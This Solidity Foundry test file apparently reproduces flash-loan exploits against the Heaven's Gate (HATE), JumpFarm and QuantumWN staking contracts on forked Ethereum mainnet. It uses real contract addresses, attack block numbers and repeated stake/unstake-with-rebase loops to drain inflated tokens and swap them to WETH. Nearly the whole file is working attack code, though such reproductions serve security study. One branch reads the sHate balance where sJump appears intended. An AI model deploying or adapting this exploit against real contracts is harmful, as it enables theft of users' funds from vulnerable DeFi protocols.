// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

interface StakingPool {
    function stake(address _to, uint256 _amount) external;
    function unstake(address _to, uint256 _amount, bool _rebase) external;

    function rebase() external;

    struct Epoch {
        uint256 length; // in seconds
        uint256 number; // since inception
        uint256 end; // timestamp
        uint256 distribute; // amount
    }
    function epoch() external returns (uint256 length, uint256 number, uint256 end,uint256 distribute);
}
 

interface IsToken is IERC20 {
    function circulatingSupply() external returns(uint256);
}

contract HeavenJumpQuantumAttacker is Test {
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    IUniswapV2Pair hate_weth = IUniswapV2Pair(0x738dab4AF8D21b7aafb73545D79D3B4831eE79dA);
    IERC20 hate = IERC20(0x7b768470590B8A0d28fC714d0A70754d556D14eD);
    StakingPool hateStaking = StakingPool(0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8);
    IsToken sHate = IsToken(0xf829d7014Db17D6DCe448bE958c7e4983cdb1F77);

    IERC20 jump = IERC20(0x39d8BCb39DE75218E3C08200D95fde3a479D7a14);
    StakingPool jumpStaking = StakingPool(0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9);
    IERC20 sJump = IERC20(0xdd28c9d511a77835505d2fBE0c9779ED39733bdE);

    IERC20 fumog = IERC20(0xc14F8A4C8272b8466659D0f058895E2F9D3ae065);
    StakingPool QWAStaking = StakingPool(0x69422c7F237D70FCd55C218568a67d00dc4ea068);
    IERC20 sFumog = IERC20(0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC);
    
    uint256 flashAmount;

    function setUp() public {
        vm.createSelectFork("eth");

        vm.label(address(hate_weth), "UniswapV2Pair: hate-weth");
        vm.label(address(hate), "hate");
        vm.label(address(hateStaking), "HateStaking");
        vm.label(address(sHate), "sHate");

    }

    function testHeavensGate1() external {
        heavensGateAttack(18069527);
    }

    function testHeavensGate2() external {
        heavensGateAttack(18071198);
    }

    function heavensGateAttack(uint256 attackBlockNumber) internal {
        vm.rollFork(attackBlockNumber);
        (, uint256 epochNumber, uint256 epochEnd, ) = hateStaking.epoch();
        emit log_named_uint("Epoch number", epochNumber);
        emit log_named_uint("Epoch end", epochEnd);
        emit log_named_decimal_uint("hate balanceOf StakingPool", hate.balanceOf(address(hateStaking)), hate.decimals());

        hate.approve(address(hateStaking), type(uint256).max);
        sHate.approve(address(hateStaking), type(uint256).max);
        if (attackBlockNumber == 18069527) {
            flashAmount =  hate.balanceOf(address(hate_weth)) * 9/10;
            hate_weth.swap(flashAmount, 0, address(this), "HeavensGate1");
        } else {
            flashAmount =  hate.balanceOf(address(hate_weth)) * 7/10;
            hate_weth.swap(flashAmount, 0, address(this), "HeavensGate2");
        }

        uint256 profitAmount = hate.balanceOf(address(this));
        emit log_named_decimal_uint("hate balance after exploit", profitAmount, hate.decimals());
        hate.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(hate);
        path[1] = address(weth);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(profitAmount, 0, path, address(this), block.timestamp);
        emit log_named_decimal_uint("weth balance after swap", weth.balanceOf(address(this)), weth.decimals());    
    }

    function uniswapV2Call(address /*sender*/, uint amount0, uint /*amount1*/, bytes calldata data) public {
        uint256 number = 0;
        uint i = 0;
        if (keccak256(data) == keccak256("HeavensGate1") || keccak256(data) == keccak256("HeavensGate2")) {
            if (keccak256(data) == keccak256("HeavensGate1")) number = 3; else number = 0x1e;
            emit log_named_decimal_uint("hate balanceOf loaned", hate.balanceOf(address(this)), hate.decimals());
            while(i < number) {
                uint balanceAttacker = hate.balanceOf(address(this));
                hateStaking.stake(address(this), balanceAttacker);
                uint sTokenBalance = sHate.balanceOf(address(this));
                hateStaking.unstake(address(this), sTokenBalance, true);
                i += 1;
            }
            uint fee = (amount0 * 3)/997+1;
            hate.transfer(msg.sender, flashAmount + fee);
        }
        else {
            number = 20;
            while(i < number) {
                uint balanceAttacker = jump.balanceOf(address(this));
                jumpStaking.stake(address(this), balanceAttacker);
                uint sTokenBalance = sHate.balanceOf(address(this));
                jumpStaking.unstake(address(this), sTokenBalance, true);
                i += 1;
            }
            uint fee = (amount0 * 3)/997+1;
            jump.transfer(msg.sender, flashAmount + fee);
        }
    }

    function testJumpFarm() external {
        uint256 attackBlockNumber = 18070346;
        vm.rollFork(attackBlockNumber); 

        jump.approve(address(jumpStaking), type(uint256).max);
        sJump.approve(address(jumpStaking), type(uint256).max);

        address[] memory token = new address[](1);
        token[0] = address(weth);
        uint256[] memory amount = new uint256[](1);
        amount[0] = 15 * 1 ether;
        balancer.flashLoan(address(this), token, amount, "JumpFarm");

        // weth.withdraw(weth.balanceOf(address(this)));
        emit log_named_decimal_uint("eth balance after exploit", weth.balanceOf(address(this)), 18);
    }

    function testQuantumWN() external {
        uint256 attackBlockNumber = 18070346;
        vm.rollFork(attackBlockNumber); 

        fumog.approve(address(QWAStaking), type(uint256).max);
        sFumog.approve(address(QWAStaking), type(uint256).max);

        address[] memory token = new address[](1);
        token[0] = address(weth);
        uint256[] memory amount = new uint256[](1);
        amount[0] = 5 * 1 ether;
        balancer.flashLoan(address(this), token, amount, "QuantumWN");

        // weth.withdraw(weth.balanceOf(address(this)));
        emit log_named_decimal_uint("eth balance after exploit", weth.balanceOf(address(this)), 18);
    }

    function receiveFlashLoan(address[] memory /*tokens*/, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external {
        IERC20 targetToken;
        IERC20 targetsToken;
        StakingPool stakingPool;
        uint256 number;
        if (keccak256(userData) == keccak256("JumpFarm")) {
            targetToken = jump;
            targetsToken = sJump; 
            stakingPool = jumpStaking;
            number = 0x28;
        } else if (keccak256(userData) == keccak256("QuantumWN")) {
            targetToken = fumog;
            targetsToken = sFumog;
            stakingPool = QWAStaking;
            number = 0x1e;
        }
        weth.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(targetToken);
        router.swapExactTokensForTokens(amounts[0], 0, path, address(this), block.timestamp);
        uint8 i = 0;
        while(i < number) {
            i += 1;
            uint256 amountToken = targetToken.balanceOf(address(this));
            stakingPool.stake(address(this), amountToken);
            uint256 amountsToken = targetsToken.balanceOf(address(this));
            stakingPool.unstake(address(this), amountsToken, true);
        }
        // uint256 amountToken = targetToken.balanceOf(address(this));
        // stakingPool.stake(address(this), amountToken);
        // while(i < number) {
        //     i += 1;
        //     stakingPool.rebase();
        // }
        // uint256 amountsToken = targetsToken.balanceOf(address(this));
        // stakingPool.unstake(address(this), amountsToken, true);

        targetToken.approve(address(router), type(uint256).max);
        uint amount = targetToken.balanceOf(address(this));
        emit log_named_decimal_uint("target token balance after exploit", amount, targetToken.decimals());
        
        path[0] = address(targetToken);
        path[1] = address(weth);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
        weth.transfer(address(balancer), amounts[0]+feeAmounts[0]);
    }
}